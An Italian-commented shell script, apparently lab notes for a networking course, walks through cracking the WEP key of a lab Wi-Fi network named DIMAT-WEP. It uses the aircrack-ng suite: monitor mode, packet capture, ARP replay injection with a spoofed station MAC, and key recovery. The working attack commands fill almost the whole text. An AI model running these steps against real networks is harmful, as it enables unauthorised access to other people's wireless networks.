
#di seguito sono elencati i passi necessari per fare il cracking di una rete wifi 
#protetta con chiave WEP sfruttando la suite di tools aircrack, ed in particolare:
#airodump: per la cattura di pacchetti 802.11 (sniffer)
#aireplay: per il packet injection
#aircrack: per il cracking di chiavi WEP 


#diventare amministratore
sudo su

#disabilitare il network-manager
/etc/init.d/network-manager stop

#creare una interfaccia di rete virtuale (associata alla scheda wireless) preimpostata 
#in modalità monitor. Potrebbe essere necessario dover disabilitare la scheda di 
#rete ad andare in modalità monitor
iw dev wlan0 interface add wlan0mon type monitor

#per entrare in modalità monitor su una qualsiasi interfaccia:
(ifconfig nomewlan0 down; iwconfig nomewlan0 mode monitor)

#vedere quali solo le reti WEP vicine e il canale corrispondente
airodump-ng wlan0mon

#nel nostro caso, DIMAT-WEP lavora sul canale 2, perciò...
airodump-ng -c 2 -w file_cattura wlan0mon

#in un altro terminale eseguire il seguente comando per ripetere il 
#sotto-comando ogni 2 secondi
#(serve per verificare se il file file_cattura.cap cresce)
watch ls -l

#eseguire il comando aircrack-ng
#aircrack chiede di scegliere interattivamente un BSSID, scegliamo quello WEP 
#corrispondente a DIMAT-WEP e 
#lasciamo che aircrack analizzi i dati crittografati alla ricerca della chiave
aircrack-ng cattura.cap

#molto probabilmente aircrack ci chiederà di provare con un numero maggiore di IV..
#Per accellerare questo processo possiamo stimolare l'invio di dati. 
#Come? Ad esempio, possiamo intercettare un frame e provare a ritrasmetterlo così com è:
# se è un ping arriverebbe la reply e potrei ritrasmetterla
#molte volte, analogamente se si tratta di pacchetti ARP.
#Notare che le repliche arriveranno sempre con IV diversi!
#Volendo sfruttare i pacchetti ARP l'idea è: individuare i frame ARP destinati all'indirizzo broadcast..
#Perciò, in un altro terminale proviamo ad eseguire il comando 
#aireplay-ng che consente di ripetere varie tipologie di frame intercettati 
#(l'opzione -3 ad esempio identifica i pacchetti ARP, l'opzione -b serve per definire il BSSID su cui
#si vuole lavorare -si vede dalla schermata di airodump-)
aireplay-ng -3 wlan0mon -b INDIRIZZO_MAC_BSSID

#A questo punto bisogna individuare un indirizzo MAC di una stazione che 
#è già associata, se noi non lo siamo.
#Ci servirà come indirizzo MAC per le repliche false di ARP da inviare.
#Possiamo utilizzare wireshark per trovare un indirizzo valido o individuarlo nella seconda 
#parte della schermata di airodump
aireplay-ng -3 wlan0mon -b INDIRIZZO_MAC_BSSID -h MAC_SORGENTE_DA_USARE_PER_REPLICHE

#Ora, disponendo di molti più IV su cui fare incroci e lavorare, nella 
#schermata di aircrak dovrebbe in poco tempo apparire la chiave





